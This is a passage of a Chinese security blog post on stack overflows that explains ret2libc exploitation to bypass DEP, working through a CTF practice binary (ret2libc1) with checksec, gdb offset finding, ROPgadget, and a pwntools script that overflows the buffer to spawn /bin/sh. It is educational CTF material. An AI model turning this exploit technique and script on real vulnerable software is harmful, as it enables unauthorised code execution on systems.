<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5"><title>栈溢出总结（0x02） | ascotbe</title><meta name="description" content="栈溢出总结（0x02）"><meta name="author" content="ascotbe"><meta name="copyright" content="ascotbe"><meta name="format-detection" content="telephone=no"><link rel="shortcut icon" href="/img/favicon.ico"><link rel="preconnect" href="//cdn.jsdelivr.net"><link rel="preconnect" href="https://fonts.googleapis.com" crossorigin><link rel="preconnect" href="//busuanzi.ibruce.info"><meta name="twitter:card" content="summary"><meta name="twitter:title" content="栈溢出总结（0x02）"><meta name="twitter:description" content="栈溢出总结（0x02）"><meta name="twitter:image" content="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/118.jpg"><meta property="og:type" content="article"><meta property="og:title" content="栈溢出总结（0x02）"><meta property="og:url" content="https://www.ascotbe.com/2020/11/20/StackOverflow_0x02/"><meta property="og:site_name" content="ascotbe"><meta property="og:description" content="栈溢出总结（0x02）"><meta property="og:image" content="https://gitee.com/asc0t6e/Random-img/raw/master/BlogCover/118.jpg"><meta http-equiv="Cache-Control" content="no-transform"><meta http-equiv="Cache-Control" content="no-siteapp"><script src="https://cdn.jsdelivr.net/npm/js-cookie/dist/js.cookie.min.js"></script><script>const autoChangeMode = '2'
var t = Cookies.get("theme");
if (autoChangeMode == '1'){
const isDarkMode = window.matchMedia("(prefers-color-scheme: dark)").matches
const isLightMode = window.matchMedia("(prefers-color-scheme: light)").matches
const isNotSpecified = window.matchMedia("(prefers-color-scheme: no-preference)").matches
const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified

if (t === undefined){
  if (isLightMode) activateLightMode()
  else if (isDarkMode) activateDarkMode()
  else if (isNotSpecified || hasNoSupport){
    console.log('You specified no preference for a color scheme or your browser does not support it. I Schedule dark mode during night time.')
    now = new Date();
    hour = now.getHours();
    isNight = hour < 6 || hour >= 18
    isNight ? activateDarkMode() : activateLightMode()
}
} else if (t == 'light') activateLightMode()
else activateDarkMode()


} else if (autoChangeMode == '2'){
  now = new Date();
  hour = now.getHours();
  isNight = hour < 6 || hour >= 18
  if(t === undefined) isNight? activateDarkMode() : activateLightMode()
  else if (t === 'light') activateLightMode()
  else activateDarkMode() 
} else {
  if ( t == 'dark' ) activateDarkMode()
  else if ( t == 'light') activateLightMode()
}

function activateDarkMode(){
  document.documentElement.setAttribute('data-theme', 'dark')
  if (document.querySelector('meta[name="theme-color"]') !== null){
    document.querySelector('meta[name="theme-color"]').setAttribute('content','#000')
  }
}
function activateLightMode(){
  document.documentElement.setAttribute('data-theme', 'light')
  if (document.querySelector('meta[name="theme-color"]') !== null){
  document.querySelector('meta[name="theme-color"]').setAttribute('content','#fff')
  }
}</script><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/font-awesome@latest/css/font-awesome.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@latest/dist/jquery.fancybox.min.css"><link rel="canonical" href="https://www.ascotbe.com/2020/11/20/StackOverflow_0x02/"><link rel="prev" title="Linux ELF格式解析" href="https://www.ascotbe.com/2020/12/06/ExecutableLinkableFormat/"><link rel="next" title="栈溢出总结（0x01）" href="https://www.ascotbe.com/2020/11/19/StackOverflow_0x01/"><link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Titillium+Web"><script>var GLOBAL_CONFIG = { 
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: {"defaultEncoding":2,"translateDelay":0,"cookieDomain":"https://www.ascotbe.com/","msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简"},
  copy: {
    success: '复制成功',
    error: '复制错误',
    noSupport: '浏览器不支持'
  },
  bookmark: {
    title: 'Snackbar.bookmark.title',
    message_prev: '按',
    message_next: '键将本页加入书签'
  },
  runtime_unit: '天',
  runtime: true,
  copyright: undefined,
  ClickShowText: undefined,
  medium_zoom: false,
  fancybox: true,
  Snackbar: undefined,
  baiduPush: false,
  isHome: false,
  isPost: true
  
}</script><meta name="generator" content="Hexo 4.2.1"></head><body><canvas class="fireworks"></canvas><header> <div id="page-header"><span class="pull_left" id="blog_name"><a class="blog_title" id="site-name" href="/">ascotbe</a></span><span class="toggle-menu pull_right close"><a class="site-page"><i class="fa fa-bars fa-fw" aria-hidden="true"></i></a></span><span class="pull_right menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/Loophole"><i class="fa-fw fa fa-link"></i><span> Loophole</span></a></div><div class="menus_item"><a class="site-page" href="/Taylor%20Swift"><i class="fa-fw fa fa-link"></i><span> Taylor Swift</span></a></div><div class="menus_item"><a class="site-page" href="/Links/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div></div></span></div></header><div id="mobile-sidebar"><div id="menu_mask"></div><div id="mobile-sidebar-menus"><div class="mobile_author_icon"><img class="avatar-img" src="/img/avatar.jpeg" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"></div><div class="mobile_post_data"><div class="mobile_data_item is-center"><div class="mobile_data_link"><a href="/archives/"><div class="headline">文章</div><div class="length_num">98</div></a></div></div></div><hr><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fa fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fa fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/Loophole"><i class="fa-fw fa fa-link"></i><span> Loophole</span></a></div><div class="menus_item"><a class="site-page" href="/Taylor%20Swift"><i class="fa-fw fa fa-link"></i><span> Taylor Swift</span></a></div><div class="menus_item"><a class="site-page" href="/Links/"><i class="fa-fw fa fa-link"></i><span> Link</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fa fa-heart"></i><span> About</span></a></div></div></div><div id="mobile-sidebar-toc"><div class="toc_mobile_headline">目录</div><div class="sidebar-toc__content"><ol class="toc_mobile_items"><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#栈的构建过程"><span class="toc_mobile_items-number">1.</span> <span class="toc_mobile_items-text">栈的构建过程</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#Ret2libc"><span class="toc_mobile_items-number">2.</span> <span class="toc_mobile_items-text">Ret2libc</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#利用原理"><span class="toc_mobile_items-number">2.1.</span> <span class="toc_mobile_items-text">利用原理</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#存在system-函数和-bin-sh字符串"><span class="toc_mobile_items-number">2.2.</span> <span class="toc_mobile_items-text">存在system()函数和&#x2F;bin&#x2F;sh字符串</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#只存在system-函数"><span class="toc_mobile_items-number">2.3.</span> <span class="toc_mobile_items-text">只存在system()函数</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-4"><a class="toc_mobile_items-link" href="#无system-函数和-bin-sh字符串"><span class="toc_mobile_items-number">2.4.</span> <span class="toc_mobile_items-text">无system()函数和&#x2F;bin&#x2F;sh字符串</span></a><ol class="toc_mobile_items-child"><li class="toc_mobile_items-item toc_mobile_items-level-5"><a class="toc_mobile_items-link" href="#start-和main-的区别"><span class="toc_mobile_items-number">2.4.1.</span> <span class="toc_mobile_items-text">_start()和main()的区别</span></a></li></ol></li></ol></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#ret2csu"><span class="toc_mobile_items-number">3.</span> <span class="toc_mobile_items-text">ret2csu</span></a></li><li class="toc_mobile_items-item toc_mobile_items-level-3"><a class="toc_mobile_items-link" href="#参考文章"><span class="toc_mobile_items-number">4.</span> <span class="toc_mobile_items-text">参考文章</span></a></li></ol></div></div></div><div id="body-wrap"><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true">     </i><div class="auto_open" id="sidebar"><div class="sidebar-toc"><div class="sidebar-toc__title">目录</div><div class="sidebar-toc__progress"><span class="progress-notice">你已经读了</span><span class="progress-num">0</span><span class="progress-percentage">%</span><div class="sidebar-toc__progress-bar">     </div></div><div class="sidebar-toc__content"><ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#栈的构建过程"><span class="toc-number">1.</span> <span class="toc-text">栈的构建过程</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#Ret2libc"><span class="toc-number">2.</span> <span class="toc-text">Ret2libc</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#利用原理"><span class="toc-number">2.1.</span> <span class="toc-text">利用原理</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#存在system-函数和-bin-sh字符串"><span class="toc-number">2.2.</span> <span class="toc-text">存在system()函数和&#x2F;bin&#x2F;sh字符串</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#只存在system-函数"><span class="toc-number">2.3.</span> <span class="toc-text">只存在system()函数</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#无system-函数和-bin-sh字符串"><span class="toc-number">2.4.</span> <span class="toc-text">无system()函数和&#x2F;bin&#x2F;sh字符串</span></a><ol class="toc-child"><li class="toc-item toc-level-5"><a class="toc-link" href="#start-和main-的区别"><span class="toc-number">2.4.1.</span> <span class="toc-text">_start()和main()的区别</span></a></li></ol></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#ret2csu"><span class="toc-number">3.</span> <span class="toc-text">ret2csu</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#参考文章"><span class="toc-number">4.</span> <span class="toc-text">参考文章</span></a></li></ol></div></div></div><main id="content-outer"><div id="top-container" style="background-image: url(https://gitee.com/asc0t6e/Random-img/raw/master/Blog/118.jpg)"><div id="post-info"><div id="post-title"><div class="posttitle">栈溢出总结（0x02）</div></div><div id="post-meta"><time class="post-meta__date"><i class="fa fa-calendar fa-fw" aria-hidden="true"></i> 发表于 2020-11-20<span class="post-meta__separator">|</span><i class="fa fa-history fa-fw" aria-hidden="true"></i> 更新于 2021-03-08</time><div class="post-meta-wordcount"><div class="post-meta-pv-cv"><span><i class="fa fa-eye post-meta__icon fa-fw" aria-hidden="true"> </i>阅读量:</span><span id="busuanzi_value_page_pv"></span></div></div></div></div></div><div class="layout layout_post" id="content-inner">   <article id="post"><div class="article-container" id="post-content"><blockquote>
<p>声明</p>
</blockquote>
<p>郑重声明：文中所涉及的技术、思路和工具仅供以安全为目的的学习交流使用，任何人不得将其用于非法用途以及盈利等目的，否则后果自行承担！</p>
<blockquote>
<p>前言</p>
</blockquote>
<p>再上篇中介绍了一些常见保护，以及如何开关，还有如何生成shellcode等操作，就那么点东西我搞了一星期，真是菜吐了，心态崩了了</p>
<a href="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/11.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="222" class="fancybox"><img alt="222" style="zoom:50%;" title="222" data-src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/11.png?raw=true" src="/img/loading.gif" class="lazyload"></a>

<blockquote>
<p>2021-3-6对文章进行修改，修改理解错误点</p>
</blockquote>
<blockquote>
<h3 id="栈的构建过程"><a href="#栈的构建过程" class="headerlink" title="栈的构建过程"></a>栈的构建过程</h3></blockquote>
<p>一个典型的栈帧布局如下所示:</p>
<ol>
<li>函数参数</li>
<li>函数返回地址</li>
<li>帧指针</li>
<li>错误处理帧</li>
<li>局部变量</li>
<li>栈缓冲区</li>
<li>被调函数保存的寄存器</li>
</ol>
<p>栈帧的布局如下图所示：</p>
<p><a href="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/24.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="img" class="fancybox"><img alt="img" title="img" data-src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/24.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
<p>在windows/Intel平台上，当发生一个函数调用时，数据通过如下的方式存放在栈上：</p>
<ol>
<li>在函数调用之前先将函数参数压栈，参数按照从<strong>右</strong>到<strong>左</strong>的顺序。</li>
<li>由x86的call指令将函数的返回地址压栈，这个返回地址就是EIP寄存器的值。</li>
<li>上一个栈帧的栈帧指针通过EBP的值压栈</li>
<li>如果函数包含了try/catch或者其他的异常处理结构（如SEH），编译器会在栈上放置异常处理所需要的信息。</li>
<li>栈上分配局部变量</li>
<li>为临时数据分配栈缓冲区</li>
<li>最后，被调函数保存ESI, EDI, EBX寄存器的值。 对于linux/intel平台，这一步在第4步之后</li>
</ol>
<blockquote>
<h3 id="Ret2libc"><a href="#Ret2libc" class="headerlink" title="Ret2libc"></a>Ret2libc</h3></blockquote>
<p>Bypass DEP 通过ret2libc绕过DEP防护，现在我们把DEP打开，依然关闭stack protector和ASLR。这时候我们按上篇无保护的思路来做题的话，系统会拒绝执行我们的shellcode。如果你通过<code>sudo cat /proc/[pid]/maps</code>查看，stack是rw的而不是rwx。</p>
<p>三道题分布对应下面三个小结</p>
<ul>
<li><a href="https://raw.githubusercontent.com/Ascotbe/Random-img/master/StackOverflow/ret2libc1" target="_blank" rel="noopener">ret2libc1</a></li>
<li><a href="https://raw.githubusercontent.com/Ascotbe/Random-img/master/StackOverflow/ret2libc2" target="_blank" rel="noopener">ret2libc2</a></li>
<li><a href="https://raw.githubusercontent.com/Ascotbe/Random-img/master/StackOverflow/ret2libc3" target="_blank" rel="noopener">ret2libc3</a></li>
</ul>
<h4 id="利用原理"><a href="#利用原理" class="headerlink" title="利用原理"></a>利用原理</h4><p>正常运行的进程，两个栈不相关</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">                             栈的压入顺序</span><br><span class="line">                          &lt;---------------</span><br><span class="line">    Current Stack</span><br><span class="line">|-----------|----------|----------------------------|-----------------|-----------------|</span><br><span class="line">|           |          |  Current Stack  Ret addr   |    .....        |   ....          |</span><br><span class="line">|-----------|----------|----------------------------|-----------------|-----------------|</span><br><span class="line">     ESP        EBP             EIP                                  args</span><br><span class="line">          </span><br><span class="line"></span><br><span class="line">          </span><br><span class="line">System Function Stack   </span><br><span class="line">|-----------|----------|----------------------------|-----------------|-----------------|</span><br><span class="line">|           |          |  System Function Ret addr  |    .....        |   ....          |</span><br><span class="line">|-----------|----------|----------------------------|-----------------|-----------------|</span><br><span class="line">      ESP       EBP             EIP                                  args</span><br></pre></td></tr></table></figure></div>

<p>Ret2libc执行system的栈布局。</p>
<p>执行顺序：溢出AAA-&gt;覆盖<strong>EIP</strong>为<code>System()</code>函数地址-&gt;通过<strong>EIP</strong>跳转到<code>System()</code>的<strong>ESP</strong>位置(也就是函数的地址位置)-&gt;把函数的<code>System()</code>栈的返回地址给覆盖(如果不考虑接下来运行执行随便复制4个字节)-&gt;传入<code>/bin/sh</code>的地址(也就是把函数System的参数地址给覆盖了)</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">              System Function Stack  </span><br><span class="line">&lt;----------------------------------------------------------&gt;</span><br><span class="line">    ESP &lt;------&gt; EBP             EIP               args</span><br><span class="line">|----------------------|-----------------------|-----------|</span><br><span class="line">|  Normal stack space  | system return address |   value   |</span><br><span class="line">|----------------------|-----------------------|-----------|</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">              Available stack  （覆盖之前） </span><br><span class="line">&lt;----------------------------------------------------------------&gt;</span><br><span class="line">    ESP &lt;------&gt; EBP                   EIP               args</span><br><span class="line">|----------------------|-----------------------------|-----------|</span><br><span class="line">|  Normal stack space  | Normal function return addr |   value   |</span><br><span class="line">|----------------------|-----------------------------|-----------|</span><br><span class="line">          利用溢出覆盖Available stack的返回地址和参数会变成</span><br><span class="line">                             |</span><br><span class="line">                             |</span><br><span class="line">                             |</span><br><span class="line">                             v</span><br><span class="line">                           </span><br><span class="line">                    Available stack （覆盖之后）</span><br><span class="line">&lt;----------------------------------------------------------&gt;</span><br><span class="line">        ESP              EBP          EIP         args</span><br><span class="line">|-----------------|--------------|-------------|-----------|</span><br><span class="line">| AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA | system addr | &quot;&#x2F;bin&#x2F;sh&quot; |</span><br><span class="line">|-----------------|--------------|-------------|-----------|</span><br><span class="line"></span><br><span class="line">最终栈执行顺序：压入我们覆盖的参数，跳转到system()函数的地址中执行该函数，进而控制程序</span><br></pre></td></tr></table></figure></div>

<hr>
<h4 id="存在system-函数和-bin-sh字符串"><a href="#存在system-函数和-bin-sh字符串" class="headerlink" title="存在system()函数和/bin/sh字符串"></a>存在system()函数和/bin/sh字符串</h4><p>以 bamboofox 中 ret2libc1 为例，首先，我们可以检查一下程序的安全保护</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">sh</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Desktop$ checksec ret2libc1</span><br><span class="line">[*] <span class="string">'/home/kali/Desktop/ret2libc1'</span></span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br></pre></td></tr></table></figure></div>

<p>源程序为 32 位，开启了 NX 保护。下面来看一下程序源代码，确定漏洞位置</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"RET2LIBC &gt;_&lt;"</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>可以看到在执行 gets 函数的时候出现了栈溢出，接着定位溢出值</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ pattern create 200</span><br><span class="line"><span class="string">'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA'</span></span><br><span class="line">gdb-peda$ run</span><br><span class="line">Starting program: /home/kali/Desktop/ret2libc1 </span><br><span class="line">RET2LIBC &gt;_&lt;</span><br><span class="line">AAA%AAsAABAA<span class="variable">$AAnAACAA</span>-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AALAAhAA7AAMAAiAA8AANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA</span><br><span class="line"></span><br><span class="line">Program received signal SIGSEGV, Segmentation fault.</span><br><span class="line">[----------------------------------registers-----------------------------------]</span><br><span class="line">EAX: 0x0 </span><br><span class="line">EBX: 0x0 </span><br><span class="line">ECX: 0xf7fb0580 --&gt; 0xfbad2288 </span><br><span class="line">EDX: 0xfbad2288 </span><br><span class="line">ESI: 0xf7fb0000 --&gt; 0x1e4d6c </span><br><span class="line">EDI: 0xf7fb0000 --&gt; 0x1e4d6c </span><br><span class="line">EBP: 0x6941414d (<span class="string">'MAAi'</span>)</span><br><span class="line">ESP: 0xffffd220 (<span class="string">"ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">EIP: 0x41384141 (<span class="string">'AA8A'</span>)</span><br><span class="line">EFLAGS: 0x10246 (carry PARITY adjust ZERO sign <span class="built_in">trap</span> INTERRUPT direction overflow)</span><br><span class="line">[-------------------------------------code-------------------------------------]</span><br><span class="line">Invalid <span class="variable">$PC</span> address: 0x41384141</span><br><span class="line">[------------------------------------stack-------------------------------------]</span><br><span class="line">0000| 0xffffd220 (<span class="string">"ANAAjAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">0004| 0xffffd224 (<span class="string">"jAA9AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">0008| 0xffffd228 (<span class="string">"AAOAAkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">0012| 0xffffd22c (<span class="string">"AkAAPAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">0016| 0xffffd230 (<span class="string">"PAAlAAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">0020| 0xffffd234 (<span class="string">"AAQAAmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">0024| 0xffffd238 (<span class="string">"AmAARAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">0028| 0xffffd23c (<span class="string">"RAAoAASAApAATAAqAAUAArAAVAAtAAWAAuAAXAAvAAYAAwAAZAAxAAyA"</span>)</span><br><span class="line">[------------------------------------------------------------------------------]</span><br><span class="line">Legend: code, data, rodata, value</span><br><span class="line">Stopped reason: SIGSEGV</span><br><span class="line">0x41384141 <span class="keyword">in</span> ?? ()</span><br><span class="line">gdb-peda$ pattern offset 0x41384141</span><br><span class="line">1094205761 found at offset: 112</span><br></pre></td></tr></table></figure></div>

<p>可以看到溢出的位置在112的地方</p>
<p>接着利用<strong>ropgadget</strong>，查看是否有<code>/bin/sh</code>存在</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/Desktop$ ROPgadget --binary ret2libc1 --string <span class="string">'/bin/sh'</span></span><br><span class="line">Strings information</span><br><span class="line">============================================================</span><br><span class="line">0x08048720 : /bin/sh</span><br></pre></td></tr></table></figure></div>

<p>并且在IDA中可以看到有<code>system</code>这个函数，如果没有开启ASRL的话再Windows上面看到的地址和你在Linux运行后的地址是相同的</p>
<p><a href="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/12.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="image-20201120115231916" class="fancybox"><img alt="image-20201120115231916" title="image-20201120115231916" data-src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/12.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
<p>我们要的东西都齐了以后，接下来就是写EXP了，EXP中栈拼接对应上面的利用原理</p>
<div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">sh = process(<span class="string">'../ret2libc1'</span>)</span><br><span class="line">context(os=<span class="string">'linux'</span>, arch=<span class="string">'x86'</span>, log_level=<span class="string">'debug'</span>)</span><br><span class="line">binsh_addr = <span class="number">0x08048720</span></span><br><span class="line">system_plt = <span class="number">0x08048460</span></span><br><span class="line">payload = flat([<span class="string">'a'</span> * <span class="number">112</span>, system_plt, <span class="string">'b'</span> * <span class="number">4</span>, binsh_addr])</span><br><span class="line">sh.sendline(payload)</span><br><span class="line"></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure></div>

<p><a href="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/13.png?raw=true" target="_blank" rel="noopener" data-fancybox="group" data-caption="image-20201120115749503" class="fancybox"><img alt="image-20201120115749503" title="image-20201120115749503" data-src="https://github.com/Ascotbe/Random-img/blob/master/StackOverflow/13.png?raw=true" src="/img/loading.gif" class="lazyload"></a></p>
<p>payload在栈中的部署：</p>
